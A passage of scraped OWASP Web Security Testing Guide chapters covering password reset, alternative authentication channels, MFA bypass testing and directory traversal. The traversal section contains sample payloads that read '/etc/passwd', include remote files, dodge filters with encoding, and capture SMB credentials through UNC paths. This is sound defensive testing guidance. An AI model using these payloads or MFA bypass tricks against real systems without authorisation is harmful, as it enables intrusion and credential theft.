scripts from other domains), then the reset token in the URL may be exposed in the HTTP `Referer` header sent in these requests. The `Referrer-Policy` HTTP header can be used to protect against this, so check if one is defined for the page.\n\n  Additionally, if the page includes any tracking, analytics or advertising scripts, the token will also be exposed to them.\n\n- Are the emails sent from a domain with anti-spoofing protection?\n\n  The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.\n\n- Is email considered sufficiently secure?\n\n  Emails are typically sent unencrypted, and in many cases the user's email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.\n\n  Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.\n\n### Tokens Sent Over SMS or Phone Call\n\nRather than sending a token in an email, an alternative approach is to send it via SMS or an automated phone call, which the user will then enter on the application. The key areas to test are:\n\n- Is the token sufficiently long and random?\n\n  Tokens sent this way are typically shorter, as they are intended to be manually typed by the user, rather than being embedded in a link. It's fairly common for applications to use six numeric digits, which only provides ~20 bits of security (feasible for an online brute-force attack), rather than the typically longer email token.\n\n  This makes it much more important that the password reset functionality is protected against brute-force attacks.\n\n- Can the token be used multiple times?\n\n  Tokens should be invalidated after they are used, otherwise they provide a persistent backdoor for the account.\n\n- Does the token expire if it remains unused?\n\n  As the shorter tokens are more susceptible to brute-force attacks, a shorter expiration time should be implemented to limit the window available for an attacker to carry out an attack.\n\n- Are appropriate rate limiting and restrictions in place?\n\n  Sending an SMS or triggering an automated phone call to a user is significantly more disruptive than sending an email, and could be used to harass a user, or even carry out a denial of service attack against their phone. The application should implement rate limiting to prevent this.\n\n  Additionally, SMS messages and phone calls often incur financial costs for the sending party. If an attacker is able to cause a large number of messages to be sent, this could result in significant costs for the website operator. This is especially true if they are sent to international or premium rate numbers. However, allowing international numbers may be a requirement of the application.\n\n- Is SMS or a phone call considered sufficiently secure?\n\n  [A variety of attacks](https://www.ncsc.gov.uk/guidance/protecting-sms-messages-used-in-critical-business-processes#section_4) have been demonstrated that would allow an attacker to effectively hijack SMS messages, there are conflicting views about whether SMS is sufficiently secure to be used as an authentication factor.\n\n  It is usually possible to answer an automated phone call with physical access to a device, without needing any kind of PIN or fingerprint to unlock the phone. In some circumstances (such as a shared office environment), this could allow an internal attacker to trivially reset another user's password by walking over to their desk when they are out of office.\n\n  Consider whether SMS or automated phone calls are appropriate, based on the context of the application that is being tested.\n\n### Security Questions\n\nRather than sending them a link or new password, security questions can be used as a mechanism to authenticate the user. This is considered to be a weak approach, and should not be used if better options are available.\n\nSee the [Testing for Weak Security Questions](08-Testing_for_Weak_Security_Question_Answer.md) guide for further information.\n\n### Authenticated Identity and Configuration Changes\n\nIf the application supports the ability to modify an account's primary identifier (such as an email address or phone number) that is utilized in the password change and reset functionalities the user should be forced to re-authenticate. When the primary identifier used in the password change functionality is able to be modified without re-authentication it allows the re-authentication in the password change functionality to be bypassed. Overall, anything that impacts the security of the account (email, MFA, backup settings, etc.) should require re-authentication before it can be modified.\n\nFor example: An application has a password reset flow that sends a reset link to the account's email address. The application also requires re-authentication if the password is attempted to be changed from the perspective of an authenticated user. If an attacker gains access to the account (via a stolen cookie, physical access to the computer, etc.) and changes the account's email address without needing to re-authenticate, then the password reset flow can be used to change the password, bypassing the authenticated password change flow.\n\n### Authenticated Password Changes\n\nOnce the user has proved their identity (either through a password reset link, a recovery code, or by logging in on the application) they should be able to change their password. The key areas to test are:\n\n- When setting the password, can you specify the user ID?\n\n  If the user ID is included in the password reset request and is not validated, it may be possible to modify it and change other users' passwords.\n\n- Is the user required to re-authenticate?\n\n  If a logged-in user tries to change their password, they should be asked to re-authenticate with their current password in order to protect against an attacker gaining temporary access to an unattended session. If the user has MFA enabled, then they would typically re-authenticate with that, rather than their password.\n\n- Is the password change form vulnerable to CSRF?\n\n  If the user isn't required to re-authenticate, then it may be possible to carry out a CSRF attack against the password reset form, allowing their account to be compromised. See the [Testing for Cross-Site Request Forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md) guide for further information.\n\n- Is a strong and effective password policy applied?\n\n  The password policy should be consistent across the registration, password change, and password reset functionality. See the [Testing for Weak Authentication Methods](07-Testing_for_Weak_Authentication_Methods.md) guide for further information.\n\n## References\n\n- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:47.293776"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md", "content": "# Testing for Weaker Authentication in Alternative Channel\n\n|ID          |\n|------------|\n|WSTG-ATHN-10|\n\n## Summary\n\nEven if the primary authentication mechanisms do not include any vulnerabilities, it may be that vulnerabilities exist in alternative legitimate authentication user channels for the same user accounts. Tests should be undertaken to identify alternative channels and, subject to test scoping, identify vulnerabilities.\n\nThe alternative user interaction channels could be utilized to circumvent the primary channel, or expose information that can then be used to assist an attack against the primary channel. Some of these channels may themselves be separate web applications using different hostnames or paths. For example:\n\n- Standard website\n- Mobile, or specific device, optimized website\n- Accessibility optimized website\n- Alternative country and language websites\n- Parallel websites that utilize the same user accounts (e.g. another website offering different functionally of the same organization, a partner website with which user accounts are shared)\n- Development, test, UAT and staging versions of the standard website\n\nBut they could also be other types of application or business processes:\n\n- Mobile device app\n- Desktop application\n- Call center operators\n- Interactive voice response or phone tree systems\n\nNote that the focus of this test is on alternative channels; some authentication alternatives might appear as different content delivered via the same website and would almost certainly be in scope for testing. These are not discussed further here, and should have been identified during information gathering and primary authentication testing. For example:\n\n- Progressive enrichment and graceful degradation that change functionality\n- Site use without cookies\n- Site use without JavaScript\n- Site use without plugins such as for Flash and Java\n\nEven if the scope of the test does not allow the alternative channels to be tested, their existence should be documented. These may undermine the degree of assurance in the authentication mechanisms and may be a precursor to additional testing.\n\n## Example\n\nThe primary website is `https://www.example.com` and authentication functions always take place on pages using TLS `https://www.example.com/myaccount/`.\n\nHowever, a separate mobile-optimized website exists that does not use TLS at all, and has a weaker password recovery mechanism `https://m.example.com/myaccount/`.\n\n## Test Objectives\n\n- Identify alternative authentication channels.\n- Assess the security measures used and if any bypasses exists on the alternative channels.\n\n## How to Test\n\n### Understand the Primary Mechanism\n\nFully test the website's primary authentication functions. This should identify how accounts are issued, created or changed and how passwords are recovered, reset, or changed. Additionally knowledge of any elevated privilege authentication and authentication protection measures should be known. These precursors are necessary to be able to compare with any alternative channels.\n\n### Identify Other Channels\n\nOther channels can be found by using the following methods:\n\n- Reading site content, especially the home page, contact us, help pages, support articles and FAQs, T&Cs, privacy notices, the robots.txt file and any sitemap.xml files.\n- Searching HTTP proxy logs, recorded during previous information gathering and testing, for strings such as \"mobile\", \"android\", blackberry\", \"ipad\", \"iphone\", \"mobile app\", \"e-reader\", \"wireless\", \"auth\", \"sso\", \"single sign on\" in URL paths and body content.\n- Use search engines to find different websites from the same organization, or using the same domain name, that have similar home page content or which also have authentication mechanisms.\n\nFor each possible channel confirm whether user accounts are shared across these, or provide access to the same or similar functionality.\n\n### Enumerate Authentication Functionality\n\nFor each alternative channel where user accounts or functionality are shared, identify if all the authentication functions of the primary channel are available, and if anything extra exists. It may be useful to create a grid like the one below:\n\n  | Primary | Mobile  |  Call Center | Partner Website |\n  |---------|---------|--------------|-----------------|\n  | Register| Yes     |     -        |       -         |\n  | Log in  | Yes     |    Yes       |    Yes(SSO)     |\n  | Log out |   -     |     -        |       -         |\n  |Password reset |   Yes  |   Yes   |       -         |\n  | -       | Change password |   -  |       -         |\n\nIn this example, mobile has an extra function \"change password\" but does not offer \"log out\". A limited number of tasks are also possible by phoning the call center. Call centers can be interesting, because their identity confirmation checks might be weaker than the website's, allowing this channel to be used to aid an attack against a user's account.\n\nWhile enumerating these it is worth taking note of how session management is undertaken, in case there is overlap across any channels (e.g. cookies scoped to the same parent domain name, concurrent sessions allowed across channels, but not on the same channel).\n\n### Review and Test\n\nAlternative channels should be mentioned in the testing report, even if they are marked as \"information only\" or \"out of scope\". In some cases the test scope might include the alternative channel (e.g. because it is just another path on the target host name), or may be added to the scope after discussion with the owners of all the channels. If testing is permitted and authorized, all the other authentication tests in this guide should then be performed, and compared against the primary channel.\n\n## Related Test Cases\n\nThe test cases for all the other authentication tests should be utilized.\n\n## Remediation\n\nEnsure a consistent authentication policy is applied across all channels so that they are equally secure.\n", "timestamp": "2025-10-24T11:39:47.387324"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication.md", "content": "# Testing Multi-Factor Authentication (MFA)\n\n|ID          |\n|------------|\n|WSTG-ATHN-11|\n\n## Summary\n\nMany applications implement Multi-Factor Authentication (MFA) as an additional layer of security to protect the login process. This is also known as two-factor authentication (2FA) or two-step verification (2SV) - although these are not strictly the same thing. MFA means asking the user to provide *at least* two different [authentication factors](#types-of-mfa) when logging in.\n\nMFA adds additional complexity to both the authentication functionality, and also to other security-related areas (such as credential management and password recovery), meaning that it is critical for it to be implemented in a correct and robust manner.\n\n## Test Objectives\n\n- Identify the type of MFA used by the application.\n- Determine whether the MFA implementation is robust and secure.\n- Attempt to bypass the MFA.\n\n## How to Test\n\n### Types of MFA\n\nMFA means that *at least* two of the following factors are required to authentication:\n\n| Factor | Examples |\n|--------|----------|\n| Something You Know | Passwords, PINs and security questions. |\n| Something You Have | Hardware or software tokens, certificates, email*, SMS, and phone calls. |\n| Something You Are | Fingerprints, facial recognition, iris scans, handprint scans and behavioural factors. |\n| Location | Source IP ranges, and geolocation. |\n\n\\* Email only really constitutes \"something you have\" if the email account itself is protected with MFA. As such, it should be considered weaker than other alternatives such as certificates or TOTP, and may not be accepted as MFA under some definitions.\n\nNote that requiring multiple examples of a single factor (such as needing both a password and a PIN) **does not constitute MFA**, although it may provide some security benefits over a simple password, and may be considered two-step verification (2SV).\n\nDue to the complexity of implementing biometrics in a browser-based environment, \"Something You Are\" is rarely used for web applications, although it is starting to be adopted using standards such as WebAuthn. The most common second factor is \"Something You Have\".\n\n### Check for MFA Bypasses\n\nThe first step for testing MFA is to identify all of the authentication functionality in the application, which may include:\n\n- The main login page.\n- Security critical functionality (such as disabling MFA or changing a password).\n- Federated login providers.\n- API endpoints (from both the main web interface and mobile apps).\n- Alternative (non-HTTP) protocols.\n- Test or debug functionality.\n\nAll of the different login methods should be reviewed, to ensure that MFA is enforced consistently. If some methods do not require MFA, then these can provide a simple method to bypass them.\n\nIf the authentication is done in multiple steps then it may be possible to bypass it by completing the first step of the authentication process (entering the username and password), and then force-browsing to the application or making direct API requests without completing the second stage (entering the MFA code).\n\nIf the authentication is using a OpenID Connect (OIDC) provider that allows custom authentication flows (or policies) such as Azure B2C, there may be multiple flows defined, some of which may not require MFA. For example if the application authenticates with a flow called `B2C_1_SignInWithMFA`, then try tampering that to `B2C_1_SignIn`, `B2C_1_SignInWithoutMFA` or other similar values.\n\nIn some cases, there may also be intentional MFA bypasses implemented, such as not requiring MFA:\n\n- From specific IP addresses (which may be spoofable using the `X-Forwarded-For` HTTP header).\n- When a specific HTTP header is set (such as a non-standard header like `X-Debug`).\n- For a specific hard-coded account (such as a \"root\" or \"breakglass\" account).\n\nWhere an application supports both local and federated logins, it may be possible to bypass the MFA if there is no strong separation between these two types of accounts. For example, if a user registers a local account and configures MFA for it, but does not have MFA configured on their account on the federated login provider, it may be possible for an attacker to re-register (or link) a federated account on the target application with the same email address by compromising the user's account on the federated login provider.\n\nFinally, if the MFA is implemented on a different system to the main application (such as on a reverse proxy, in order to protect a legacy application that does not natively support MFA), then it may be possible to bypass it by connecting directly to the backend application server, as discussed in the guide on how to [map the application architecture](../01-Information_Gathering/10-Map_Application_Architecture.md#content-delivery-network-cdn).\n\n### Check MFA Management\n\nThe functionality used to manage MFA from inside the user's account should be tested for vulnerabilities, including:\n\n- Is the user required to re-authenticate to remove or change MFA settings?\n- Is the MFA management functionality vulnerable to [cross-site request forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)?\n- Can other users' MFA setting be modified through [IDOR vulnerabilities](../05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)?\n\n### Check MFA Recovery Options\n\nMany applications will provide users with a way to regain access to their account if they are unable to authenticate with their second factor (for example if they have lost their phone). These mechanisms can often represent a significant weakness in the application, as they effectively allow the second authentication factor to be bypassed.\n\n#### Recovery Codes\n\nSome applications will provide the user with a list of recovery or backup codes when they enable MFA, which can be used to login. These should be checked to ensure:\n\n- They are sufficiently long and complex to protect against brute-force attacks.\n- They are securely generated.\n- They can only be used once.\n- Brute-force protection is in place (such as account lockout).\n- The user is notified (via email, SMS, etc) when a code is used.\n\nSee the [\"Backup Codes\" section in the Forgotten Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html#backup-codes) for further details.\n\n#### MFA Reset Process\n\nIf the application implements an MFA reset process, this should be tested in the same way that the [password reset process](09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md) is tested. It is important that this process is *at least* as strong as the MFA implementation for the application.\n\n#### Alternative Authentication\n\nSome applications will allow the user to prove their identity through other means, such as the use of [security questions](08-Testing_for_Weak_Security_Question_Answer.md). This usually represents a significant weakness, as security questions provide a far lower level of security than MFA.\n\n### One-Time Passwords\n\nThe most common form of MFA is the one of One-Time Passwords (OTPs), which are typically six-digit numeric codes (although they can be longer or shorter). These can either be generated by both the server and the user (for example, with an authenticator app), or can be generated on the server and sent to the user. There are various ways that this OTP can be provided to the user, including:\n\n| Type | Description |\n|------|-------------|\n| HMAC One-Time Password (HOPT) | Generates a code based on the HMAC of a secret and a shared counter. |\n| Time-based One-Time Password (TOTP) | Generates a code based on HMAC of a secret and the current time. |\n| Email | Sends a code via email. |\n| SMS | Sends a code via SMS. |\n| Phone | Sends a code via a voice call to a phone number. |\n\nThe OTP is typically entered after the user has provided their username and password. There are various checks that should be performed, including:\n\n- Is the account locked out after multiple failed MFA attempts?\n- Is the user's IP address blocked after multiple failed MFA attempts across different accounts?\n- Are failed MFA attempts logged?\n- Is the form vulnerable to injection attacks, including [SQL wildcard injection](../07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#sql-wildcard-injection)?\n\nDepending on the type of OTPs used, there are also some other specific checks that should be performed:\n\n- How are OTPs sent to user (email, SMS, phone, etc)\n    - Is there rate limiting to prevent SMS/phone spam costing money?\n- How strong are OTPs (length and keyspace)?\n- How long are OTPs valid for?\n- Are multiple OTPs valid at once?\n- Can the OTPs be used more than once?\n- Are the OTPs tied to the correct user account or is it possible to authenticate with them on other accounts?\n\n#### HOTP and TOTP\n\nHOTP and TOTP codes are both based on a secret that is shared between the server and the user. For TOTP codes, this is usually provided to the user in the form of a QR code that they scan with an authenticator app (although it can also be provided as a text secret for them to manually enter).\n\nWhere the secret is generated on the server, it should be checked to ensure that it is sufficiently long and complex ([RFC 4226](https://www.rfc-editor.org/rfc/rfc4226#section-4) recommends at least 160 bits), and that it is generated using a [secure random function](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation).\n\nWhere the secret can be provided by the user, an appropriate minimum length should be enforced, and the input should be checked for the usual injection attacks.\n\nTOTP codes are typically valid for 30 seconds, but some applications choose to accept multiple codes (such as the previous, current, and next codes) in order to deal with differences between the system time on the server and on the user's device. Some applications may allow multiple codes on either side of the current one, which may make it easier for an attacker to guess or brute-force the code. The table below shows the chance of successfully brute-forcing an OTP code based on an attacker being able to make 10 requests a second, for applications that accept either only the current code, or multiple codes (see [this article](https://www.codasecurity.co.uk/articles/mfa-testing#case-study---brute-forcing-totp) for the calculations behind the table).\n\n| Valid Codes | Success rate after 1 hour | Success rate after 4 hours | Success rate after 12 hours | Success rate after 24 hours |\n|-------------|---------------------------|----------------------------|-----------------------------|-----------------------------|\n| 1 | 4%  | 13% | 35% | 58% |\n| 3 | 10% | 35% | 72% | 92% |\n| 5 | 16% | 51% | 88% | 99% |\n| 7 | 22% | 63% | 95% | 99% |\n\n#### Email, SMS, and Phone\n\nWhere codes are generated by the server and sent to the client, the following areas should be considered:\n\n- Is the transport mechanism (email, SMS, or voice) secure enough for the application?\n- Are the codes sufficiently long and complex?\n- Are the codes generated using a [secure random function](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation)?\n- How long are the codes valid for?\n- Are multiple codes valid at once, or does generating a new code invalidate the previous one?\n    - Could this be used to block access to an account by repeatedly requesting codes?\n- Is there sufficient rate-limiting to prevent an attacker requesting large numbers of codes?\n    - Large numbers of emailed code may get the server blocked for sending spam.\n    - Large numbers of SMS or voice calls may cost money, or be used to harass a user.\n\n### Mobile Apps and Push Notifications\n\nAn alternative approach to OTP codes is to send a push notification to the user's mobile phone, which they can either approve or deny. This method is less common, as it requires the user to install an application-specific authenticator.\n\nProperly evaluating the security of this requires the scope of testing to be expanded to cover both the mobile app, and any supporting APIs or services used by it; meaning that it would often be outside of the scope of a traditional web application test. However, there are a couple of simple checks that can be performed without testing the mobile app, including:\n\n- Does the notification provide sufficient context (IP addresses, location, etc) for the user to make an informed decision about whether to approve or deny it?\n- Is there any kind of challenge and response mechanism (such as providing a code on the site that the user needs to enter into the app - often called \"number matching\" or \"number challenge\")?\n- Is there any rate limiting or mechanisms to prevent the user from being spammed with notifications in the hope that they will just blindly accept one?\n\n### IP Address and Location Filtering\n\nOne of the factors that is sometimes used with MFA is location (\"somewhere you are\"), although whether this constitutes a proper authentication factor is debatable. In the context of a web application, this typically means restricting access to specific IP addresses, or not prompting the user for a second factor as long as they are connecting from a specific trusted IP address. A common scenario for this would be to authenticate users with just their password when connecting from the office IP ranges, but requiring an OTP code when they connect from elsewhere.\n\nDepending on the implementation, it may be possible for a user to spoof a trusted IP address by setting the `X-Forwarded-For` header, which could allow them to bypass this check. Note that if the application does not correctly sanitize the contents of this header, it may also be possible to carry out attack such as SQL injection here. If the application supports IPv6, then this should also be checked to ensure that appropriate restrictions are applied to those connections.\n\nAdditionally, the trusted IP addresses should be reviewed to ensure that they do not present any weaknesses, such as if they include:\n\n- IP addresses that could be accessible by untrusted users (such as the guest wireless networks in an office).\n- Dynamically assigned IP address that could change.\n- Public network ranges where an attacker could host their own system (such as Azure or AWS).\n\n### Certificates and Smartcards\n\nTransport Layer Security (TLS) is commonly used to encrypt traffic between the client and the server, and to provide a mechanism for the client to confirm the identity of the server (by comparing Common Name (CN) or Subject Alternative Name (SAN) on the certificate to the requested domain). However, it can also provide a mechanism for the server to confirm the identity of the client, known as client certificate authentication or mutual TLS (mTLS). A full discussion of client certificate authentication is outside of the scope of this guide, but the key principle is that the user presents a digital certificate (stored either on their machine or on a smartcard), which is validated by the server.\n\nThe first step when testing is to determine whether the target application restricts the Certificate Authorities (CAs) that are trusted to issue certificates. This information can be obtained using various tools, or by manually examining the TLS handshake. The simplest way is to use OpenSSL's `s_client`:\n\n```bash\n$ openssl s_client -connect example:443\n[...]\nAcceptable client certificate CA names\nC = US, ST = Example, L = Example, O = Example Org, CN = Example Org Root Certificate Authority\nClient Certificate Types: RSA sign, DSA sign, ECDSA sign\n```\n\nIf there are no restrictions, then it may be possible to authenticate using a certificate from a different CA. If there are restrictions but they are badly implemented, it may be possible to create a local CA with the correct name (\"Example Org Root Certificate Authority\" in the example above), and to use this new CA to sign client certificates.\n\nIf a valid certificate can be obtained, then it should also be verified that the certificate can only be used for the user that it is issued for (i.e, that you can't use a certificate issued to Alice to authenticate on Bob's account). Additionally, certificates should be checked to ensure that they have neither expired nor been revoked.\n\n## Related Test Cases\n\n- [Testing for Weak Lock Out Mechanism](03-Testing_for_Weak_Lock_Out_Mechanism.md)\n- [Testing for Weak Password Change or Reset Functionalities](09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md)\n\n## Remediation\n\nEnsure that:\n\n- MFA is implemented for all relevant accounts and functionality on the applications.\n- The support MFA methods are appropriate for the application.\n- The mechanisms used to implement MFA are appropriately secured and protected against brute-force attacks.\n- There is appropriate auditing and logging for all MFA-related activity.\n\nSee the [OWASP Multi-Factor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) for further recommendations.\n\n## References\n\n- [OWASP Multi-Factor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:47.497518"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/README.md", "content": "# 4.4 Authentication Testing\n\n4.4.1 [Testing for Credentials Transported over an Encrypted Channel](01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md)\n\n4.4.2 [Testing for Default Credentials](02-Testing_for_Default_Credentials.md)\n\n4.4.3 [Testing for Weak Lock Out Mechanism](03-Testing_for_Weak_Lock_Out_Mechanism.md)\n\n4.4.4 [Testing for Bypassing Authentication Schema](04-Testing_for_Bypassing_Authentication_Schema.md)\n\n4.4.5 [Testing for Vulnerable Remember Password](05-Testing_for_Vulnerable_Remember_Password.md)\n\n4.4.6 [Testing for Browser Cache Weaknesses](06-Testing_for_Browser_Cache_Weaknesses.md)\n\n4.4.7 [Testing for Weak Authentication Methods](07-Testing_for_Weak_Authentication_Methods.md)\n\n4.4.8 [Testing for Weak Security Question Answer](08-Testing_for_Weak_Security_Question_Answer.md)\n\n4.4.9 [Testing for Weak Password Change or Reset Functionalities](09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md)\n\n4.4.10 [Testing for Weaker Authentication in Alternative Channel](10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md)\n\n4.4.11 [Testing Multi-Factor Authentication](11-Testing_Multi-Factor_Authentication.md)\n", "timestamp": "2025-10-24T11:39:47.599950"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md", "content": "# Testing Directory Traversal File Include\n\n|ID          |\n|------------|\n|WSTG-ATHZ-01|\n\n## Summary\n\nMany web applications use and manage files as part of their daily operation. Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.\n\nTraditionally, web servers and web applications implement authentication mechanisms to control access to files and resources. Web servers try to confine users' files inside a \"root directory\" or \"web document root\", which represents a physical directory on the file system. Users have to consider this directory as the base directory into the hierarchical structure of the web application.\n\nThe definition of the privileges is made using Access Control Lists (ACL) which identify which users or groups are supposed to be able to access, modify, or execute a specific file on the server. These mechanisms are designed to prevent malicious users from accessing sensitive files (for example, the common `/etc/passwd` file on a UNIX-like platform) or to avoid the execution of system commands.\n\nMany web applications use server-side scripts to include different kinds of files. It is quite common to use this method to manage images, templates, load static texts, and so on. Unfortunately, these applications expose security vulnerabilities if input parameters (i.e., form parameters, cookie values) are not correctly validated.\n\nIn web servers and web applications, this kind of problem arises in path traversal/file include attacks. By exploiting this kind of vulnerability, an attacker is able to read directories or files which they normally couldn't read, access data outside the web document root, or include scripts and other kinds of files from external sites.\n\nFor the purpose of the OWASP Testing Guide, only the security threats related to web applications will be considered and not threats to web servers (e.g., the infamous `%5c` escape code into Microsoft IIS web server). Further reading suggestions will be provided in the references section for interested readers.\n\nThis kind of attack is also known as the dot-dot-slash attack (`../`), directory traversal, directory climbing, or backtracking.\n\nDuring an assessment, to discover path traversal and file include flaws, testers need to perform two different stages:\n\n1. Input Vectors Enumeration (a systematic evaluation of each input vector)\n2. Testing Techniques (a methodical evaluation of each attack technique used by an attacker to exploit the vulnerability)\n\n## Test Objectives\n\n- Identify injection points that pertain to path traversal.\n- Assess bypassing techniques and identify the extent of path traversal.\n\n## How to Test\n\n### Black-Box Testing\n\n#### Input Vectors Enumeration\n\nIn order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.\n\nHere are some examples of the checks to be performed at this stage:\n\n- Are there request parameters which could be used for file-related operations?\n- Are there unusual file extensions?\n- Are there interesting variable names?\n    - `https://example.com/getUserProfile.jsp?item=ikki.html`\n    - `https://example.com/index.php?file=content`\n    - `https://example.com/main.cgi?home=index.htm`\n- Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?\n    - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`\n    - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`\n\n#### Testing Techniques\n\nThe next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called `getUserProfile.jsp` loads static information from a file and shows the content to users. An attacker could insert the malicious string `../../../../etc/passwd` to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.\n\n**Note:** To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting `/etc/passwd` from an IIS web server.\n\n```text\nhttps://example.com/getUserProfile.jsp?item=../../../../etc/passwd\n```\n\nAnother common example is including content from an external source:\n\n```text\nhttps://example.com/index.php?file=https://www.owasp.org/malicioustxt\n```\n\nThe same can be applied to cookies or any other input vector that is used for dynamic page generation.\n\nMore file inclusion payloads can be found at [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)\n\nIt is important to note that different operating systems use different path separators\n\n- Unix-like OS:\n    - root directory: `/`\n    - directory separator: `/`\n- Windows OS:\n    - root directory: `<drive letter>:`\n    - directory separator: `\\` or `/`\n- Classic macOS:\n    - root directory: `<drive letter>:`\n    - directory separator: `:`\n\nIt's a common mistake by developers to not expect every form of encoding and therefore only do validation for basic encoded content. If at first the test string isn't successful, try another encoding scheme.\n\nYou can find encoding techniques and ready to use directory traversal payloads at [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)\n\n#### Windows Specific Considerations\n\n- Windows shell: Appending any of the following to paths used in a shell command results in no difference in function:\n    - Angle brackets `<` and `>` at the end of the path\n    - Double quotes (closed properly) at the end of the path\n    - Extraneous current directory markers such as `./` or `.\\\\`\n    - Extraneous parent directory markers with arbitrary items that may or may not exist:\n        - `file.txt`\n        - `file.txt...`\n        - `file.txt<spaces>`\n        - `file.txt\"\"\"\"`\n        - `file.txt<<<>>><`\n        - `./././file.txt`\n        - `nonexistant/../file.txt`\n- Windows API: The following items are discarded when used in any shell command or API call where a string is taken as a filename:\n    - periods\n    - spaces\n- Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server.\n    - `\\\\server_or_ip\\path\\to\\file.abc`\n    - `\\\\?\\server_or_ip\\path\\to\\file.abc`\n- Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow access to file systems using a different path.\n    - May be equivalent to a drive letter such as `c:\\`, or even a drive volume without an assigned letter: `\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\`\n    - Refers to the first disc drive on the machine: `\\\\.\\CdRom0\\`\n\n### Gray-Box Testing\n\nWhen the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily and accurately. During a source code review, they can use simple tools (such as the *grep* command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.\n\n- `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`\n- `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`\n- `ASP: include file, include virtual, ...`\n\nUsing online code search engines (e.g., [Searchcode](https://searchcode.com/)), it may also be possible to find path traversal flaws in Open Source software published on the internet.\n\nFor PHP, testers can use the following regex:\n\n```text\n(include|require)(_once)?\\s*['\"(]?\\s*\\$_(GET|POST|COOKIE)\n```\n\nUsing the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even impossible to find during a standard black-box assessment.\n\nSome web applications generate dynamic pages using values and parameters stored in a database. It may be possible to insert specially crafted path traversal strings when the application adds data to the database. This kind of security problem is difficult to discover due to the fact the parameters inside the inclusion functions seem internal and **safe** but are not in reality.\n\nAdditionally, by reviewing the source code it is possible to analyze the functions that are supposed to handle invalid input: some developers try to change invalid input to make it valid, avoiding warnings and errors. These functions are usually prone to security flaws.\n\nConsider a web application with these instructions:\n\n```php\nfilename = Request.QueryString(\"file\");\nReplace(filename, \"/\",\"\\\");\nReplace(filename, \"..\\\",\"\");\n```\n\nTesting for the flaw is achieved by:\n\n```text\nfile=....//....//boot.ini\nfile=....\\\\....\\\\boot.ini\nfile= ..\\..\\boot.ini\n```\n\n## Tools\n\n- [DotDotPwn - The Directory Traversal Fuzzer](https://github.com/wireghoul/dotdotpwn)\n- [Path Traversal Fuzz Strings (from WFuzz 